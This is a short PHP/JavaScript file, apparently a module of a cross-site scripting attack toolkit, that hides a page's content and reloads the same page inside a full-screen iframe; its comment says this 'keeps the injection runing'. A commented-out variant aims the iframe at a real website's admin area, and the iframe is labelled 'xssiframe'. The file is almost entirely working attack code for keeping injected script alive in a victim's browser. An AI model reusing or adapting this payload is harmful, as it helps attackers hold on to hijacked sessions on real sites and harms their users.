<?php
# removes document body and replaces it with and iframe of the same document.
# this keeps the injection runing.
?>
debug("begin frame_me");

debug("checking if frame already injected");
if (window.top!=window.self) {
	debug("Frame already injected, done.");
} else {
	debug("Injecting frame...");

	$('body').children().hide();
	debug("body hidden");


	var ifr = $('<iframe>').css({
		 position: 'absolute',
		 width: '100%',
		 height: '100%',
		 top: 0,
		 left: 0,
		 border: 0,
		 background: '#fff',
		"z-index":10
	 }).attr('src', window.location.href).appendTo('body');
/*
console.log(window.location.href);
	 }).attr('src', window.location.href).appendTo('body');
	 }).attr('src', window.location.href);
	ifr.id = "xssiframe";
	ifr.appendTo("body");
	 }).attr('src', "http://bodyspace.bodybuilding.com/admin/").appendTo('body');
*/
console.log(ifr);


	debug("Frame complete ("+window.location.href+")");
}
